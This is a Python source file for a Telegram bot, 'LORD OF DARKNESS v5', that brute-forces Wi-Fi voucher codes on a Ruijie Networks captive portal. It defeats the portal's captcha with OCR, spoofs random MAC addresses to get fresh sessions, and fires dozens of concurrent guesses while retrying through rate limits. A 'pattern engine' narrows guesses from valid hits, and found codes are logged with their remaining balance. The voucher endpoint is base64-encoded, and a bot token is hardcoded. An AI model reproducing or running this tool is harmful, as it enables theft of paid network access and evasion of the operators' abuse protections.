# ruijie_voucher_v5.py
# Engine: main1.py H4CK3R core (correct authCode flow)
# Interface: Telegram bot + Pattern Engine
# pip install pyTelegramBotAPI aiohttp opencv-python-headless ddddocr numpy requests

import asyncio, aiohttp, json, random, re, os
import string, time, uuid, logging, threading, sys
import base64
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import cv2, ddddocr, numpy as np
from collections import deque, defaultdict

logging.basicConfig(level=logging.WARNING)

BOT_TOKEN  = "8421895968:AAFzH6OUrzMc-UWHZVGBoI4ZJrmFwz2f21M"
ADMIN_ID   = "8056336803"

THREADS    = 80
TIMEOUT    = 30
BATCH_SIZE = 400
UI_SEC     = 3.0
RESULT_FILE = os.path.expanduser("~/hits_v5.txt")

# Voucher endpoint (same as main1.py — base64 decoded)
_POST_URL = base64.b64decode(
    b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
).decode()

CAPTCHA_IMG_URL = "https://portal-as.ruijienetworks.com/api/auth/captcha/image"
CAPTCHA_VFY_URL = "https://portal-as.ruijienetworks.com/api/auth/captcha/verify"

# ════════════════════════════════════════════
# GLOBALS
# ════════════════════════════════════════════
bot              = AsyncTeleBot(BOT_TOKEN)
user_data        = {}
scan_tasks       = {}
success_texts    = {}
success_messages = {}
hit_codes        = defaultdict(list)
limited_codes    = defaultdict(list)

_connector  = None
_ocr        = None
_ocr_lock   = threading.Lock()
_start_time = time.monotonic()

# Per-chat scan stats
_tried    = defaultdict(int)
_hits     = defaultdict(int)
_limited  = defaultdict(int)
_retries  = defaultdict(int)
_scan_start = {}

STATE_FILE = "state_v5.json"
HITS_FILE  = "hits_v5.json"


# ════════════════════════════════════════════
# PATTERN ENGINE
# ════════════════════════════════════════════
class PatternEngine:
    def __init__(self):
        self.hits       = []
        self.parity     = None
        self.range_bias = None
        self.step_bias  = None

    def feed(self, code: str):
        try:
            n = int(code)
            self.hits.append(n)
            self._analyze()
        except ValueError:
            pass

    def _analyze(self):
        if not self.hits:
            return
        parities = [h % 2 for h in self.hits]
        if all(p == 0 for p in parities):
            self.parity = 'even'
        elif all(p == 1 for p in parities):
            self.parity = 'odd'
        else:
            self.parity = None
        center = int(sum(self.hits) / len(self.hits))
        spread = max(abs(h - center) for h in self.hits) if len(self.hits) > 1 else 50000
        self.range_bias = (center, max(spread, 10000))
        if len(self.hits) >= 2:
            sh   = sorted(self.hits)
            gaps = [sh[i+1] - sh[i] for i in range(len(sh)-1)]
            if len(set(gaps)) == 1:
                self.step_bias = gaps[0]

    def next_code(self, length: int) -> str:
        lo = 10 ** (length - 1)
        hi = 10 ** length - 1
        if self.step_bias and len(self.hits) >= 2:
            candidate = sorted(self.hits)[-1] + self.step_bias
            if lo <= candidate <= hi and self._parity_ok(candidate):
                return str(candidate).zfill(length)
        if self.range_bias and random.random() < 0.70:
            center, radius = self.range_bias
            lo_b = max(lo, center - radius)
            hi_b = min(hi, center + radius)
            n = random.randint(lo_b, hi_b)
            if not self._parity_ok(n):
                n = n + 1 if n + 1 <= hi_b else n - 1
            return str(n).zfill(length)
        while True:
            n = random.randint(lo, hi)
            if self._parity_ok(n):
                return str(n).zfill(length)

    def _parity_ok(self, n):
        if self.parity == 'even':
            return n % 2 == 0
        if self.parity == 'odd':
            return n % 2 == 1
        return True

    def summary(self):
        parts = []
        if self.parity:
            parts.append(f"Parity:{self.parity}")
        if self.range_bias:
            c, r = self.range_bias
            parts.append(f"Range:{c-r:,}-{c+r:,}")
        if self.step_bias:
            parts.append(f"Step:{self.step_bias}")
        return " | ".join(parts) if parts else "Learning..."

_patterns = defaultdict(PatternEngine)


# ════════════════════════════════════════════
# OCR — from main1.py (proven working)
# ════════════════════════════════════════════
def _init_ocr():
    global _ocr
    if _ocr is None:
        with _ocr_lock:
            if _ocr is None:
                _ocr = ddddocr.DdddOcr(show_ad=False)
    return _ocr


def _ocr_sync(image_bytes: bytes):
    ocr = _init_ocr()
    if ocr is None:
        return None
    try:
        nparr = np.frombuffer(image_bytes, np.uint8)
        img   = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        if img is None:
            return None
        gray  = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        # CLAHE + Otsu (better than plain Otsu)
        clahe = cv2.createCLAHE(clipLimit=2.0, tileGridSize=(4, 4))
        gray  = clahe.apply(gray)
        blur  = cv2.GaussianBlur(gray, (3, 3), 0)
        _, th = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
        kernel = cv2.getStructuringElement(cv2.MORPH_RECT, (2, 2))
        clean  = cv2.morphologyEx(th, cv2.MORPH_OPEN, kernel)
        _, buf = cv2.imencode('.png', clean)
        result = ocr.classification(buf.tobytes())
        return result.upper().strip() if result else None
    except Exception:
        return None


async def Captcha_Text(img_bytes: bytes):
    return await asyncio.to_thread(_ocr_sync, img_bytes)


async def Captcha_Image(sess, session_id: str):
    h = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/*,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    async with sess.get(CAPTCHA_IMG_URL,
                         params={'sessionId': session_id, '_t': str(time.time())},
                         headers=h, ssl=False) as r:
        return await r.read()


async def Verify_Captcha(sess, session_id: str, text: str):
    h = {
        'authority': 'portal-as.ruijienetworks.com',
        'content-type': 'application/json',
        'user-agent': 'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    async with sess.post(CAPTCHA_VFY_URL, headers=h,
                          json={'sessionId': session_id, 'authCode': text},
                          ssl=False) as r:
        d = await r.json()
        return text if d.get("success") is True else None


# ════════════════════════════════════════════
# SESSION — from main1.py
# ════════════════════════════════════════════
def get_mac() -> str:
    b = random.choice([0x02, 0x06, 0x0A, 0x0E])
    return ":".join(f"{x:02x}" for x in ([b] + [random.randint(0, 255) for _ in range(5)]))


def replace_mac(url: str, new_mac: str) -> str:
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)


async def get_session_id(sess, session_url: str):
    url = replace_mac(session_url, get_mac())
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    try:
        async with sess.get(url, headers=headers, allow_redirects=True, ssl=False) as r:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(r.url))
            return sid.group(1) if sid else None
    except Exception:
        return None


# ════════════════════════════════════════════
# BALANCE CHECK — both endpoints (main1.py)
# ════════════════════════════════════════════
async def Code_Expires_Date(session_id: str) -> str:
    h_macc2 = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, */*; q=0.01',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    h_auth = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/json;',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    endpoints = [
        (f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}', h_auth),
        (f'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}', h_macc2),
    ]
    for url, headers in endpoints:
        try:
            async with aiohttp.ClientSession(
                connector=_connector, connector_owner=False,
                timeout=aiohttp.ClientTimeout(total=15)
            ) as s:
                async with s.get(url, headers=headers, ssl=False) as r:
                    data = await r.json()
                    res  = data.get('result', {})
                    plan = res.get('profileName', 'Unknown')
                    remaining = res.get('remainingMinutes')
                    if remaining is not None:
                        hh, mm = divmod(int(remaining), 60)
                        time_str = f"{hh}h {mm}m" if hh else f"{mm}m"
                        return f"Plan:{plan} | Time:{time_str}"
                    total = res.get('totalMinutes')
                    if total is not None:
                        hh, mm = divmod(int(total), 60)
                        time_str = f"{hh}h {mm}m" if hh else f"{mm}m"
                        return f"Plan:{plan} | Time:{time_str}"
        except Exception:
            continue
    return "Plan:Active | Time:Check Portal"


# ════════════════════════════════════════════
# CORE CHECK — main1.py engine, correct authCode
# ════════════════════════════════════════════
async def perform_check(session_url: str, code: str,
                         chat_id: int, scan_id: str | None = None,
                         recheck: bool = False) -> str | None:
    if not recheck:
        task = scan_tasks.get(chat_id)
        if not task or task.get("scan_id") != scan_id or task.get("stop"):
            return None

    headers_post = {
        "authority":    "portal-as.ruijienetworks.com",
        "accept":       "*/*",
        "content-type": "application/json",
        "origin":       "https://portal-as.ruijienetworks.com",
        "user-agent":   "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 "
                        "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    }

    for attempt in range(3):
        async with aiohttp.ClientSession(
            connector=_connector, connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=aiohttp.ClientTimeout(total=TIMEOUT)
        ) as sess:
            session_id = await get_session_id(sess, session_url)
            if not session_id:
                return None

            # ── Solve captcha (correct flow from main1.py) ──
            auth_code = None
            for _ in range(8):
                try:
                    img      = await Captcha_Image(sess, session_id)
                    text     = await Captcha_Text(img)
                    if not text:
                        continue
                    verified = await Verify_Captcha(sess, session_id, text)
                    if verified:
                        auth_code = text   # ← actual OCR text, NOT session_id
                        break
                except Exception:
                    pass

            if not auth_code:
                _retries[chat_id] += 1
                return None

            if not recheck:
                task = scan_tasks.get(chat_id)
                if not task or task.get("scan_id") != scan_id or task.get("stop"):
                    return None

            payload = {
                "accessCode": code,
                "sessionId":  session_id,
                "apiVersion": 1,
                "authCode":   auth_code,   # ← correct
            }

            try:
                async with sess.post(_POST_URL, json=payload,
                                      headers=headers_post, ssl=False) as r:
                    response = await r.text()
            except Exception:
                return None

        # request limited — retry
        if 'request limited' in response:
            _retries[chat_id] += 1
            await asyncio.sleep(0.5)
            continue
        break
    else:
        return None

    _tried[chat_id] += 1

    # ── HIT ──
    if 'logonUrl' in response:
        info = await Code_Expires_Date(session_id)
        _patterns[chat_id].feed(code)
        hit_codes[chat_id].append(code)
        pattern_info = _patterns[chat_id].summary()

        hit_line = (f"🩸 <code>{code}</code>\n"
                    f" └ <i>{info}</i>\n"
                    f" └ 🧠 <i>{pattern_info}</i>")
        success_texts.setdefault(chat_id, []).append(hit_line)
        _hits[chat_id] += 1

        try:
            with open(RESULT_FILE, "a", encoding="utf-8") as f:
                f.write(f"[HIT] {code} | {info}\n")
        except Exception:
            pass

        horror_ui = (
            "👁️ <b>[ LORD OF DARKNESS CAPTURED! ]</b> 🩸\n"
            "☠️━━━━━━━━━━━━━━━━━━━━☠️\n"
            + "\n".join(success_texts[chat_id]) +
            "\n☠️━━━━━━━━━━━━━━━━━━━━☠️\n"
            "👻 <i>Claimed by LORD OF DARKNESS v5...</i>"
        )
        try:
            if chat_id not in success_messages:
                sent = await bot.send_message(chat_id, horror_ui, parse_mode="HTML",
                                               reply_markup=main_control_menu(chat_id))
                success_messages[chat_id] = sent.message_id
            else:
                await bot.edit_message_text(chat_id=chat_id,
                                             message_id=success_messages[chat_id],
                                             text=horror_ui, parse_mode="HTML",
                                             reply_markup=main_control_menu(chat_id))
        except Exception:
            pass
        save_hits()
        return code

    # ── LIMITED (used/expired code) ──
    elif 'STA' in response:
        _limited[chat_id] += 1
        limited_codes[chat_id].append(code)

    return None


# ════════════════════════════════════════════
# CODE GENERATORS
# ════════════════════════════════════════════
def iter_codes(mode: str, chat_id: int):
    engine = _patterns[chat_id]
    lower  = string.ascii_lowercase
    upper  = string.ascii_uppercase
    alnum  = string.ascii_letters + string.digits

    if mode in ("6", "7"):
        length = int(mode)
        codes  = [str(i).zfill(length) for i in range(10 ** length)]
        if engine.parity == 'even':
            codes = [c for c in codes if int(c) % 2 == 0]
        elif engine.parity == 'odd':
            codes = [c for c in codes if int(c) % 2 == 1]
        random.shuffle(codes)
        yield from codes
        return

    if mode in ("8", "9", "10", "12") or mode.startswith("num_"):
        length = int(mode) if mode.isdigit() else int(mode.split("_")[1])
        while True:
            yield engine.next_code(length)
    elif mode == "lower":
        while True:
            yield ''.join(random.choice(lower) for _ in range(8))
    elif mode == "upper":
        while True:
            yield ''.join(random.choice(upper) for _ in range(8))
    elif mode == "mixed":
        while True:
            yield ''.join(random.choice(alnum) for _ in range(8))
    else:
        raise ValueError(f"Unknown mode: {mode}")


# ════════════════════════════════════════════
# PERSISTENCE
# ════════════════════════════════════════════
def save_state():
    try:
        with open(STATE_FILE, "w") as f:
            json.dump({"user_data": {str(k): v for k, v in user_data.items()}}, f)
    except Exception:
        pass


def load_state():
    global user_data
    if not os.path.exists(STATE_FILE):
        return
    try:
        with open(STATE_FILE) as f:
            payload = json.load(f)
        for k, v in payload.get("user_data", {}).items():
            user_data[int(k)] = v
    except Exception:
        pass


def save_hits():
    try:
        with open(HITS_FILE, "w") as f:
            json.dump({str(k): v for k, v in success_texts.items()}, f, indent=2)
    except Exception:
        pass


def load_hits():
    if not os.path.exists(HITS_FILE):
        return
    try:
        with open(HITS_FILE) as f:
            payload = json.load(f)
        for k, v in payload.items():
            try:
                success_texts[int(k)] = v
            except ValueError:
                pass
    except Exception:
        pass


async def check_session_url(session_url: str) -> bool:
    try:
        from urllib.parse import urlparse, parse_qs
        params = parse_qs(urlparse(session_url).query)
        return all(k in params for k in ('gw_id', 'gw_address', 'gw_port', 'mac', 'ip'))
    except Exception:
        return False


# ════════════════════════════════════════════
# RUNNER
# ════════════════════════════════════════════
async def run_bruteforce(mode: str, chat_id: int, session_url: str,
                          scan_id: str, progress_msg):
    try:
        code_iter = iter_codes(mode, chat_id)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return

    total       = 10 ** int(mode) if mode in ("6", "7") else None
    checked     = 0
    _tried[chat_id]   = 0
    _hits[chat_id]    = 0
    _limited[chat_id] = 0
    _retries[chat_id] = 0
    _scan_start[chat_id] = time.monotonic()
    last_ui     = time.monotonic()
    sem         = asyncio.Semaphore(THREADS)

    try:
        while True:
            task = scan_tasks.get(chat_id)
            if not task or task.get("scan_id") != scan_id or task.get("stop"):
                return

            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            async def _check(c):
                async with sem:
                    return await perform_check(session_url, c, chat_id, scan_id)

            await asyncio.gather(*[_check(c) for c in batch], return_exceptions=True)
            checked += len(batch)
            now      = time.monotonic()

            if now - last_ui >= UI_SEC:
                last_ui = now
                elapsed = now - _scan_start[chat_id]
                speed   = (_tried[chat_id] / elapsed * 60) if elapsed > 0 else 0
                pattern = _patterns[chat_id].summary()
                txt     = format_progress(checked, total, speed, chat_id, pattern)
                try:
                    await bot.edit_message_text(chat_id=chat_id,
                                                 message_id=progress_msg.message_id,
                                                 text=txt, parse_mode="HTML",
                                                 reply_markup=main_control_menu(chat_id))
                except Exception:
                    pass

        found   = _hits[chat_id]
        elapsed = time.monotonic() - _scan_start.get(chat_id, time.monotonic())
        finish  = format_completion(checked, found, elapsed, chat_id)
        try:
            await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id,
                                         text=finish, parse_mode="HTML",
                                         reply_markup=main_control_menu(chat_id))
        except Exception:
            await bot.send_message(chat_id, finish, parse_mode="HTML",
                                    reply_markup=main_control_menu(chat_id))
    finally:
        scan_tasks.pop(chat_id, None)


# ════════════════════════════════════════════
# FORMATTERS
# ════════════════════════════════════════════
def format_progress(checked, total, speed, chat_id, pattern):
    found   = _hits[chat_id]
    limited = _limited[chat_id]
    retries = _retries[chat_id]
    speed_str = f"{speed:,.0f}/min"
    pat_line  = f"\nPattern : {pattern}" if pattern != "Learning..." else ""
    if total:
        pct = (checked / total * 100)
        bar = f"[{'X' * int(pct/8)}{'-' * (12 - int(pct/8))}] {pct:.1f}%"
        return (
            f"<b>LORD OF DARKNESS v5</b>\n"
            f"Status  : SUMMONING\n"
            f"Hits    : {found}\n"
            f"Limited : {limited}\n"
            f"Speed   : {speed_str}\n"
            f"Retries : {retries}\n"
            f"Scanned : {checked:,} / {total:,}"
            f"{pat_line}\n"
            f"{bar}"
        )
    return (
        f"<b>LORD OF DARKNESS v5</b>\n"
        f"Status  : DEVOURING\n"
        f"Hits    : {found}\n"
        f"Limited : {limited}\n"
        f"Speed   : {speed_str}\n"
        f"Retries : {retries}\n"
        f"Scanned : {checked:,}"
        f"{pat_line}"
    )


def format_completion(checked, found, elapsed, chat_id):
    m, s    = divmod(int(elapsed), 60)
    t       = f"{m}m {s}s" if m else f"{s}s"
    limited = _limited[chat_id]
    return (
        f"<b>LORD OF DARKNESS v5 DONE</b>\n\n"
        f"Scanned : {checked:,}\n"
        f"Hits    : {found}\n"
        f"Limited : {limited}\n"
        f"Time    : {t}"
    )


# ════════════════════════════════════════════
# UI
# ════════════════════════════════════════════
def main_control_menu(chat_id):
    has_link    = chat_id in user_data and 'session_url' in user_data[chat_id]
    is_scanning = chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done()
    markup      = InlineKeyboardMarkup(row_width=2)
    if is_scanning:
        markup.add(
            InlineKeyboardButton("Stop",      callback_data="btn_stop"),
            InlineKeyboardButton("Status",    callback_data="btn_status"),
        )
        markup.add(
            InlineKeyboardButton("Graveyard", callback_data="btn_graveyard"),
            InlineKeyboardButton("Limited",   callback_data="btn_limited"),
        )
        markup.add(
            InlineKeyboardButton("Back",      callback_data="btn_back"),
        )
    elif not has_link:
        markup.add(InlineKeyboardButton("Link ချိတ်ဆက်ရန်", callback_data="btn_bind"))
    else:
        markup.add(
            InlineKeyboardButton("Scan စတင်",    callback_data="btn_scan_menu"),
            InlineKeyboardButton("Recheck Hits", callback_data="btn_recheck"),
        )
        markup.add(
            InlineKeyboardButton("Graveyard",    callback_data="btn_graveyard"),
            InlineKeyboardButton("Link အသစ်",   callback_data="btn_bind"),
        )
        markup.add(
            InlineKeyboardButton("Status",       callback_data="btn_status"),
            InlineKeyboardButton("Pattern Info", callback_data="btn_pattern"),
        )
    return markup


def scan_menu_keyboard():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("6-Digit",      callback_data="scan_6"),
        InlineKeyboardButton("7-Digit",      callback_data="scan_7"),
        InlineKeyboardButton("8-Digit",      callback_data="scan_8"),
        InlineKeyboardButton("9-Digit",      callback_data="scan_9"),
        InlineKeyboardButton("10-Digit",     callback_data="scan_10"),
        InlineKeyboardButton("12-Digit",     callback_data="scan_12"),
        InlineKeyboardButton("Lowercase",    callback_data="scan_lower"),
        InlineKeyboardButton("Uppercase",    callback_data="scan_upper"),
        InlineKeyboardButton("Mixed",        callback_data="scan_mixed"),
        InlineKeyboardButton("Main Menu",    callback_data="btn_back"),
    )
    return markup


# ════════════════════════════════════════════
# HANDLERS
# ════════════════════════════════════════════
@bot.message_handler(commands=['start', 'menu'])
async def cmd_start(message):
    chat_id = message.chat.id
    await bot.reply_to(message,
                        "<b>LORD OF DARKNESS v5</b>\n"
                        "H4CK3R Engine + Pattern Learning\n\n"
                        "Portal URL paste လုပ်ပါ သို့မဟုတ် ခလုတ် နှိပ်ပါ။",
                        parse_mode="HTML", reply_markup=main_control_menu(chat_id))


@bot.message_handler(func=lambda m: m.text and not m.text.startswith("/"))
async def msg_handler(message):
    chat_id = message.chat.id
    text    = message.text.strip()
    if text.startswith("http://") or text.startswith("https://"):
        if await check_session_url(text):
            user_data.setdefault(chat_id, {})
            user_data[chat_id]['session_url'] = text
            success_texts.pop(chat_id, None)
            success_messages.pop(chat_id, None)
            _patterns[chat_id] = PatternEngine()
            hit_codes[chat_id] = []
            save_state()
            await bot.reply_to(message,
                                "<b>Link bound.</b> Scan စတင်ပါ။",
                                parse_mode="HTML", reply_markup=main_control_menu(chat_id))
        else:
            await bot.reply_to(message, "<b>Invalid URL</b> — gw_id, mac, ip ပါရမည်။",
                                parse_mode="HTML")
    else:
        await bot.reply_to(message, "ခလုတ်များကိုသာ နှိပ်ပါ။",
                            reply_markup=main_control_menu(chat_id))


@bot.callback_query_handler(func=lambda call: True)
async def cb_handler(call):
    chat_id = call.message.chat.id
    msg_id  = call.message.message_id
    data    = call.data

    async def edit(text, markup=None):
        await bot.edit_message_text(text, chat_id=chat_id, message_id=msg_id,
                                     parse_mode="HTML",
                                     reply_markup=markup or main_control_menu(chat_id))

    try:
        if data == "btn_back":
            await edit("<b>LORD OF DARKNESS v5</b>")

        elif data == "btn_bind":
            await edit("Portal URL (gw_id, mac, ip ပါသော) ကို Chat ထဲ Paste ပါ။")

        elif data == "btn_scan_menu":
            if 'session_url' not in user_data.get(chat_id, {}):
                await bot.answer_callback_query(call.id, "Link ချိတ်ဆက်ပါ!", show_alert=True)
                return
            await edit("<b>Scan Mode ရွေးပါ</b>", scan_menu_keyboard())

        elif data.startswith("scan_"):
            mode = data.replace("scan_", "")
            if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
                await bot.answer_callback_query(call.id, "Scan ပြုလုပ်နေဆဲ!", show_alert=True)
                return
            progress_msg = await bot.edit_message_text(
                "<b>LORD OF DARKNESS v5 starting...</b>",
                chat_id=chat_id, message_id=msg_id, parse_mode="HTML",
                reply_markup=main_control_menu(chat_id))
            scan_id = str(uuid.uuid4())
            task    = asyncio.create_task(
                run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'],
                               scan_id, progress_msg))
            scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}

        elif data == "btn_stop":
            td = scan_tasks.get(chat_id)
            if td and not td["task"].done():
                td["stop"] = True
                td["scan_id"] = None
                td["task"].cancel()
                await edit("<b>Ritual stopped.</b>")
            else:
                await bot.answer_callback_query(call.id, "Scan မရှိပါ!", show_alert=True)

        elif data == "btn_limited":
            codes = limited_codes.get(chat_id, [])
            if not codes:
                await bot.answer_callback_query(call.id, "Limited codes မရှိသေးပါ!", show_alert=True)
                return
            parts = ["<b>LIMITED (" + str(len(codes)) + ")</b>"] + ["<code>" + c + "</code>" for c in codes[:30]]
            await edit("\n".join(parts))

        elif data == "btn_graveyard":
            success = success_texts.get(chat_id, [])
            if not success:
                await bot.answer_callback_query(call.id, "Hits မရှိသေးပါ!", show_alert=True)
                return
            parts = [f"<b>HITS ({len(success)})</b>"] + success[:20]
            await edit("\n\n".join(parts))

        elif data == "btn_recheck":
            success = success_texts.get(chat_id, [])
            if not success:
                await bot.answer_callback_query(call.id, "Hits မရှိသေးပါ!", show_alert=True)
                return
            await bot.edit_message_text("<i>Rechecking...</i>",
                                         chat_id=chat_id, message_id=msg_id, parse_mode="HTML")
            new_success = []
            for item in success:
                code = item.split("<code>")[1].split("</code>")[0] if "<code>" in item else item
                if await perform_check(user_data[chat_id]['session_url'], code, chat_id, recheck=True):
                    new_success.append(item)
            success_texts[chat_id] = new_success
            save_hits()
            msg = f"<b>{len(new_success)} hits still active!</b>" if new_success else "<b>All expired.</b>"
            await edit(msg)

        elif data == "btn_status":
            active  = sum(1 for d in scan_tasks.values() if not d["task"].done())
            up      = int(time.monotonic() - _start_time)
            h, rem  = divmod(up, 3600)
            m, s    = divmod(rem, 60)
            elapsed = time.monotonic() - _scan_start.get(chat_id, time.monotonic())
            speed   = (_tried[chat_id] / elapsed * 60) if elapsed > 0 else 0
            await edit(
                f"<b>LORD OF DARKNESS v5 STATUS</b>\n\n"
                f"Uptime   : {h}h {m}m {s}s\n"
                f"Scans    : {active}\n"
                f"Hits     : {_hits[chat_id]}\n"
                f"Limited  : {_limited[chat_id]}\n"
                f"Retries  : {_retries[chat_id]}\n"
                f"Speed    : {speed:,.0f}/min\n"
                f"Pattern  : {_patterns[chat_id].summary()}"
            )

        elif data == "btn_pattern":
            engine = _patterns[chat_id]
            await edit(
                f"<b>PATTERN ENGINE v5</b>\n\n"
                f"Hits learned : {len(engine.hits)}\n"
                f"Parity       : {engine.parity or 'Unknown'}\n"
                f"Range        : {f'{engine.range_bias[0]-engine.range_bias[1]:,} to {engine.range_bias[0]+engine.range_bias[1]:,}' if engine.range_bias else 'None'}\n"
                f"Step         : {engine.step_bias or 'None'}\n"
                f"Summary      : {engine.summary()}"
            )

    except Exception:
        pass

    try:
        await bot.answer_callback_query(call.id)
    except Exception:
        pass


# ════════════════════════════════════════════
# MAIN
# ════════════════════════════════════════════
async def main():
    global _connector
    _connector = aiohttp.TCPConnector(limit=THREADS + 50, ssl=False)
    _init_ocr()
    load_state()
    load_hits()
    print("LORD OF DARKNESS v5 online.")
    await bot.infinity_polling(timeout=20, request_timeout=35)


if __name__ == '__main__':
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        pass
